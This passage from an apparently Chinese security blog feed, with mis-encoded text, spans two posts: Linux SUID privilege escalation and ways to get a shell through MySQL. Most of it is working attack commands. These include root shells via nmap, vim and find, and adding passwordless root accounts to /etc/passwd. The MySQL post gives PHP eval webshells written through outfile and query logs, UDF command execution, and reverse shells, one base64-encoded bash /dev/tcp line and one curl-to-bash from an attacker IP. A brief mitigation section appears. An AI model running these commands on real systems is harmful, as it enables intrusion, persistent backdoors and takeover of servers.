href="#0x03-å¸¸ç”¨äºSUIDææƒçš„å‘½ä»¤" class="headerlink" title="0x03 å¸¸ç”¨äºSUIDææƒçš„å‘½ä»¤"></a>0x03 å¸¸ç”¨äºSUIDææƒçš„å‘½ä»¤</h2><p>ä¸‹é¢ä»‹ç»å‡ ç§å‘½ä»¤ï¼Œå¦‚æœè¿™äº›å‘½ä»¤å…·æœ‰SUIDæƒé™ï¼Œå°†æœ‰æœ¬åœ°ææƒçš„é£é™©ã€‚</p><h3 id="3-1-nmap"><a href="#3-1-nmap" class="headerlink" title="3.1 nmap"></a>3.1 nmap</h3><h4 id="3-1-1-nmap-2-02-5-21ç‰ˆæœ¬"><a href="#3-1-1-nmap-2-02-5-21ç‰ˆæœ¬" class="headerlink" title="3.1.1 nmap 2.02-5.21ç‰ˆæœ¬"></a>3.1.1 nmap 2.02-5.21ç‰ˆæœ¬</h4><p>nampåœ¨ä½ç‰ˆæœ¬å…·æœ‰äº¤äº’æ¨¡å¼ï¼Œå¯åˆ©ç”¨äº¤äº’æ¨¡å¼ææƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure><p>å¦å¤–Metasploitä¹Ÿæœ‰nmapææƒçš„æ¨¡å—ï¼š<code>exploit/unix/local/setuid_nmap</code></p><h4 id="3-1-2-nmapé«˜ç‰ˆæœ¬"><a href="#3-1-2-nmapé«˜ç‰ˆæœ¬" class="headerlink" title="3.1.2 nmapé«˜ç‰ˆæœ¬"></a>3.1.2 nmapé«˜ç‰ˆæœ¬</h4><p>nampåœ¨é«˜ç‰ˆæœ¬å–æ¶ˆäº†äº¤äº’æ¨¡å¼ï¼Œå¯ç¼–å†™nmapçš„nseè„šæœ¬ï¼Œä¿®æ”¹<code>/etc/passwd</code>æ¥æ–°å¢ä¸€ä¸ªç”¨æˆ·root2æ¥è¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">file:<span class="built_in">write</span>(<span class="string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)</span><br><span class="line">file:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626174624539.png" class="" title="image-20210626174624539"><p>è‹¥nampå¯ç›´æ¥sudoæ‰§è¡Œï¼Œåˆ™å¯ç›´æ¥ä½¿ç”¨nseè„šæœ¬è°ƒç”¨<code>os.execute</code>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure><h3 id="3-2-find"><a href="#3-2-find" class="headerlink" title="3.2 find"></a>3.2 find</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627125229567.png" class="" title="image-20210627125229567"><h3 id="3-3-vi-vim"><a href="#3-3-vi-vim" class="headerlink" title="3.3 vi/vim"></a>3.3 vi/vim</h3><p>è¿›å…¥vimæ¨¡å¼æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134106867.png" class="" title="image-20210627134106867"><p>è‹¥æœ‰sudoæƒé™åˆ™å¯æ‰§è¡Œ<code>sudo vim -c &#39;!sh&#39;</code>ç›´æ¥ææƒ</p><h3 id="3-4-bash"><a href="#3-4-bash" class="headerlink" title="3.4 bash"></a>3.4 bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134208588.png" class="" title="image-20210627134208588"><h3 id="3-5-cp"><a href="#3-5-cp" class="headerlink" title="3.5 cp"></a>3.5 cp</h3><p>è·Ÿé«˜ç‰ˆæœ¬nmapææƒæ–¹æ³•ç±»ä¼¼ï¼Œè¦†ç›– <code>/etc/shadow</code> æˆ– <code>/etc/passwd</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd &gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;root3::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp passwd /etc/passwd</span>  </span><br><span class="line"><span class="meta">$</span><span class="bash"> su root3</span> </span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627142406117.png" class="" title="image-20210627142406117"><h3 id="3-6-mv"><a href="#3-6-mv" class="headerlink" title="3.6 mv"></a>3.6 mv</h3><p>åŒcpå‘½ä»¤çš„æ­¥éª¤ï¼Œè¦†ç›– <code>/etc/shadow</code> æˆ– <code>/etc/passwd</code></p><h3 id="3-7-nano"><a href="#3-7-nano" class="headerlink" title="3.7 nano"></a>3.7 nano</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano filename</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143244017.png" class="" title="image-20210627143244017"><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143211352.png" class="" title="image-20210627143211352"><h3 id="3-8-wget"><a href="#3-8-wget" class="headerlink" title="3.8 wget"></a>3.8 wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.88.88/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="3-9-å…¶ä»–æµ‹è¯•æœªææƒæˆåŠŸçš„å‘½ä»¤"><a href="#3-9-å…¶ä»–æµ‹è¯•æœªææƒæˆåŠŸçš„å‘½ä»¤" class="headerlink" title="3.9 å…¶ä»–æµ‹è¯•æœªææƒæˆåŠŸçš„å‘½ä»¤"></a>3.9 å…¶ä»–æµ‹è¯•æœªææƒæˆåŠŸçš„å‘½ä»¤</h3><p>ç½‘ä¸Šè§åˆ°æœ‰å¸ˆå‚…æ•´ç†çš„suidææƒå‘½ä»¤ä¹ŸåŒ…æ‹¬ä¸‹é¢å‡ ç§ï¼Œä½†æˆ‘åœ¨Ubuntu 18å’Œkali 2020ä¸­æµ‹è¯•å¹¶ä¸èƒ½ææƒæˆåŠŸï¼Œè¿”å›çš„åªæ˜¯å½“å‰ç”¨æˆ·çš„shellï¼Œè¿™é‡Œå…ˆè®°å½•ä¸‹</p><h4 id="3-9-1-less"><a href="#3-9-1-less" class="headerlink" title="3.9.1 less"></a>3.9.1 less</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><h4 id="3-9-2-more"><a href="#3-9-2-more" class="headerlink" title="3.9.2 more"></a>3.9.2 more</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h4 id="3-9-3-awk"><a href="#3-9-3-awk" class="headerlink" title="3.9.3 awk"></a>3.9.3 awk</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><h4 id="3-9-4-man"><a href="#3-9-4-man" class="headerlink" title="3.9.4 man"></a>3.9.4 man</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h4 id="3-9-5-python-perl-ruby-lua-php-etc"><a href="#3-9-5-python-perl-ruby-lua-php-etc" class="headerlink" title="3.9.5 python/perl/ruby/lua/php/etc"></a>3.9.5 python/perl/ruby/lua/php/etc</h4><p>python</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="0x04-å¦‚ä½•ç¼“è§£"><a href="#0x04-å¦‚ä½•ç¼“è§£" class="headerlink" title="0x04 å¦‚ä½•ç¼“è§£"></a>0x04 å¦‚ä½•ç¼“è§£</h2><p>ç®¡ç†å‘˜åº”ä»”ç»†å®¡æŸ¥æ‰€æœ‰SUIDäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹çœ‹åˆ°åº•æ˜¯å¦çœŸçš„éœ€è¦ä½¿ç”¨ææƒåè¿è¡Œã€‚åœ¨è¿™ä¸ªå®¡æŸ¥è¿‡ç¨‹ä¸­ï¼Œ<strong>åº”è¯¥ç‰¹åˆ«å…³æ³¨èƒ½å¤Ÿåœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œä»£ç æˆ–å†™å…¥æ•°æ®çš„é‚£äº›åº”ç”¨ç¨‹åº</strong>ã€‚</p><p>å¯¹äºç±»ä¼¼nmapå’Œpingçš„ç¨‹åºï¼Œåªéœ€è¦ç½‘ç»œç›¸å…³çš„ç‰¹æƒå³å¯ï¼ŒLinux 2.2ä»¥åå¢åŠ äº†capabilitiesçš„æ¦‚å¿µï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åˆ°capabilitiesè¿™ä¸œè¥¿åšæƒé™åˆ†ç¦»ã€‚</p><p>æŸ¥çœ‹kaliä¸‹pingå‘½ä»¤çš„capabilities</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">getcap</span> /usr/bin/ping</span></span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ<code>ping</code>å‘½ä»¤æœªè®¾ç½®suidæƒé™ï¼Œå´ä»ç„¶å¯ä»¥ä»¥æ™®é€šç”¨æˆ·èº«ä»½è¿è¡Œçš„åŸå› ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥ç»™nmapå‘½ä»¤å¢åŠ ç±»ä¼¼çš„capabilitiesï¼Œæ™®é€šç”¨æˆ·å°±å¯ä»¥æ‰§è¡ŒTCP SYNæ‰«æå•¦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap</span><br><span class="line">nmap --privileged -sU 127.0.0.1</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627151220669.png" class="" title="image-20210627151220669"><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >è°ˆä¸€è°ˆLinuxä¸suidææƒ<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/sparkdev/p/9651622.html" >Linux ç‰¹æ®Šæƒé™ SUID,SGID,SBIT<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://jlkl.github.io/2020/01/27/Web_15/" >Linux SUID ææƒ<i class="fas fa-external-link-alt"></i></a></p><p>ã€Šé¸Ÿå“¥çš„linuxç§æˆ¿èœï¼ˆç¬¬å››ç‰ˆï¼‰â€“6.4.3ç« ã€‹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡mysqlè·å–shellçš„å‡ ç§æ–¹æ³•</title>
      <link href="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-åˆ©ç”¨outfileå‡½æ•°å†™shell"><a href="#0x01-åˆ©ç”¨outfileå‡½æ•°å†™shell" class="headerlink" title="0x01 åˆ©ç”¨outfileå‡½æ•°å†™shell"></a>0x01 åˆ©ç”¨outfileå‡½æ•°å†™shell</h2><p><strong>æ¡ä»¶</strong></p><p>1.å½“å‰æ•°æ®åº“ç”¨æˆ·ä¸ºrootæƒé™</p><p>2.secure-file-privä¸ºç©ºï¼ˆæˆ–åŒ…å«webç›®å½•ï¼‰</p><p>3.å·²çŸ¥ç½‘ç«™çš„ç»å¯¹è·¯å¾„ä¸”å…·æœ‰å†™çš„æƒé™</p><p><strong>åˆ©ç”¨æ­¥éª¤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php  @eval($_POST[1]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;;</span><br><span class="line">#å½“ç„¶ä¹Ÿå¯ä»¥insertåˆ°è¡¨åå†select è¡¨ into outfileåˆ°phpæ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="0x02-åˆ©ç”¨dumpfileå‡½æ•°è¿›è¡Œudfææƒ"><a href="#0x02-åˆ©ç”¨dumpfileå‡½æ•°è¿›è¡Œudfææƒ" class="headerlink" title="0x02 åˆ©ç”¨dumpfileå‡½æ•°è¿›è¡Œudfææƒ"></a>0x02 åˆ©ç”¨dumpfileå‡½æ•°è¿›è¡Œudfææƒ</h2><p><strong>æ¡ä»¶</strong></p><p>1.rootæƒé™æ‰§è¡Œçš„Mysql</p><p>2.secure_file_privä¸ºç©ºï¼ˆæˆ–åŒ…å«udfç›®å½•ï¼‰</p><p>3.udfç›®å½•å…·æœ‰å†™æƒé™</p><p><strong>åˆ©ç”¨æ­¥éª¤</strong></p><p>ä»sqlmapæˆ–msfé€‰æ‹©é€‚åˆç›®æ ‡ç³»ç»Ÿçš„udfè„šæœ¬ï¼Œä¿å­˜è§£ç å¹¶hexåçš„æ–‡ä»¶å†…å®¹ï¼ˆè§£ç æ­¥éª¤å‚è€ƒ<a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf.dll(.so)%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC(hex)">å°çŸ¥è¯†ç‚¹</a>)ï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>; #æŸ¥çœ‹udfå…è®¸çš„ç›®å½•</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                 <span class="operator">|</span> <span class="keyword">Value</span>                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> default_authentication_plugin <span class="operator">|</span> mysql_native_password  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plugin_dir                    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> unhex(<span class="string">&#x27;udf.so hex code&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/shell.so&#x27;</span>; #windowsä¸ºdllï¼Œlinuxä¸ºsoæ–‡ä»¶</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> string soname <span class="string">&#x27;shell.so&#x27;</span>; #è¿™é‡Œçš„soæ–‡ä»¶ä¸èƒ½åŠ ç»å¯¹è·¯å¾„</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func; #æŸ¥çœ‹å·²åˆ›å»ºçš„ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl         <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> shell.so   <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>); #è¿”å›<span class="keyword">NULL</span>è¯´æ˜æ‰§è¡ŒæˆåŠŸäº†ï¼Œè¿™é‡Œä½¿ç”¨çš„sqlmapè‡ªå¸¦çš„udfè„šæœ¬æ˜¯ä¸å¸¦å›æ˜¾çš„</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure><p>å½“lib/pluginç›®å½•ä¸å­˜åœ¨æ—¶å¯ä»¥ä½¿ç”¨NTFS ADSæµåˆ›å»ºlibã€pluginæ–‡ä»¶å¤¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   &#x2F;&#x2F;æŸ¥æ‰¾mysqlçš„ç›®å½•</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    &#x2F;&#x2F;ä½¿ç”¨NTFS ADSæµåˆ›å»ºlibç›®å½•</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;; &#x2F;&#x2F;åˆ©ç”¨NTFS ADSå†æ¬¡åˆ›å»ºpluginç›®å½•</span><br><span class="line">æ‰§è¡ŒæˆåŠŸä»¥åå†è¿›è¡Œå¯¼å‡ºå³å¯ã€‚</span><br></pre></td></tr></table></figure><p><strong>udfå®éªŒè¿‡ç¨‹é‡åˆ°çš„å‘ç‚¹</strong></p><ol><li><p>å—åˆ°secure_file_privçš„ç›®å½•é™åˆ¶ï¼Œè¯¥é»˜è®¤ç›®å½•ä¸udfæ’ä»¶çš„ç›®å½•ä¸ä¸€æ ·ï¼Œå¯¼è‡´dumpfileå¤±è´¥</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221223977.png" class="" title="image-20210131221223977"><p>é€šè¿‡ä¿®æ”¹/etc/mysql/mysql.conf.d/mysqld.cnfæ–‡ä»¶secure_file_privä¸ºç©º</p></li><li><p>æ²¡æœ‰å†™çš„æƒé™</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221824261.png" class="" title="image-20210131221824261"><p>unbutué€šè¿‡<code>service apparmor teardown</code>å…³é—­apparmorå®‰å…¨æ¨¡å¼ï¼Œå¹¶è®¾ç½®/usr/lib/mysql/pluginæƒé™ä¸º777</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131223336103.png" class="" title="image-20210131223336103"></li></ol><p>è‹¥æ˜¯centos ï¼Œä¿®æ”¹<code>/etc/sysconfig/selinux</code>æ–‡ä»¶<code>SELINUX=disabled</code>æ¥ç¦ç”¨å®‰å…¨æ¨¡å¼</p><p>3.å°†ç»å¯¹è·¯å¾„å¯¼è‡´soæ–‡ä»¶æ‰¾ä¸åˆ°ï¼Œå»æ‰è·¯å¾„å³å¯</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620172930780.png" class="" title="image-20210620172930780"><h2 id="0x03-å¼€å¯å…¨å±€æ—¥å¿—å†™å…¥shell"><a href="#0x03-å¼€å¯å…¨å±€æ—¥å¿—å†™å…¥shell" class="headerlink" title="0x03 å¼€å¯å…¨å±€æ—¥å¿—å†™å…¥shell"></a>0x03 å¼€å¯å…¨å±€æ—¥å¿—å†™å…¥shell</h2><p>å‰ä¸¤ä¸ªåˆ©ç”¨æ–¹æ³•éƒ½å—åˆ°secure_file_privçš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…¨å±€æ—¥å¿—æˆ–æ…¢æŸ¥è¯¢æ—¥å¿—å†™shellç»•è¿‡è¯¥é™åˆ¶</p><p><strong>æ¡ä»¶</strong></p><p>1.rootæƒé™æ‰§è¡Œçš„Mysql</p><p>2.ç½‘ç«™çš„ç»å¯¹è·¯å¾„ä¸”å…·æœ‰å†™å…¥æƒé™</p><p><strong>åˆ©ç”¨æ­¥éª¤</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>; #å¼€å¯å…¨å±€é…ç½®</span><br><span class="line"><span class="keyword">set</span>Â <span class="keyword">global</span>Â general_log_fileÂ <span class="operator">=</span>Â <span class="string">&#x27;/var/WWW/shell.php&#x27;</span>; #å°†æ—¥å¿—æ–‡ä»¶è®¾ç½®æˆæœåŠ¡å™¨ä¸‹çš„æœ¨é©¬æ–‡ä»¶</span><br><span class="line"><span class="keyword">select</span>Â <span class="string">&#x27;&lt;?php Â @eval($_POST[1]);?&gt;&#x27;</span>; #æ‰§è¡Œ<span class="keyword">sql</span>è¯­å¥ï¼Œmysqlä¼šå°†æˆ‘æ²¡æ‰§è¡Œçš„è¯­å¥è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶(ä¸Šä¸€æ­¥ä¿®æ”¹åçš„æ–‡ä»¶)ä¸­</span><br></pre></td></tr></table></figure><h2 id="0x04-å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shell"><a href="#0x04-å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shell" class="headerlink" title="0x04 å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shell"></a>0x04 å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shell</h2><p><strong>æ¡ä»¶</strong></p><p>1.rootæƒé™æ‰§è¡Œçš„Mysql</p><p>2.ç½‘ç«™çš„ç»å¯¹è·¯å¾„ä¸”å…·æœ‰å†™å…¥æƒé™</p><p><strong>åˆ©ç”¨æ­¥éª¤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">showÂ variables likeÂ &#39;%slow_query_log%&#39;; #æŸ¥çœ‹æ…¢æŸ¥è¯¢æ—¥å¿—å¼€å¯æƒ…å†µ</span><br><span class="line">setÂ globalÂ slow_query_log&#x3D;1; #å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—</span><br><span class="line">setÂ globalÂ slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;; #ä¿®æ”¹æ—¥å¿—æ–‡ä»¶å­˜å‚¨çš„ç»å¯¹è·¯å¾„</span><br><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; or sleep(11); #å‘æ—¥å¿—æ–‡ä»¶ä¸­å†™å…¥shell</span><br></pre></td></tr></table></figure><h2 id="0x05-åˆ©ç”¨systemå‡½æ•°åå¼¹shell"><a href="#0x05-åˆ©ç”¨systemå‡½æ•°åå¼¹shell" class="headerlink" title="0x05 åˆ©ç”¨systemå‡½æ•°åå¼¹shell"></a>0x05 åˆ©ç”¨systemå‡½æ•°åå¼¹shell</h2><p>mysqlåœ¨5.7ç‰ˆæœ¬ä¹‹åè‡ªå¸¦æœ‰ä¸ªsystemå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620180803889.png" class="" title="image-20210620180803889"><p><strong>æ¡ä»¶</strong></p><p>1.mysqlç‰ˆæœ¬å¤§äº5.7</p><p><strong>åˆ©ç”¨æ­¥éª¤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#base64ç¼–ç ååå¼¹</span><br><span class="line">system bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;;</span><br><span class="line">#åˆ©ç”¨curlè®¿é—®æ”»å‡»è€…webæœåŠ¡å™¨ï¼Œshell.htmlå†…å®¹ä¸ºbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142&#x2F;shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="0x06-å°çŸ¥è¯†ç‚¹"><a href="#0x06-å°çŸ¥è¯†ç‚¹" class="headerlink" title="0x06 å°çŸ¥è¯†ç‚¹"></a>0x06 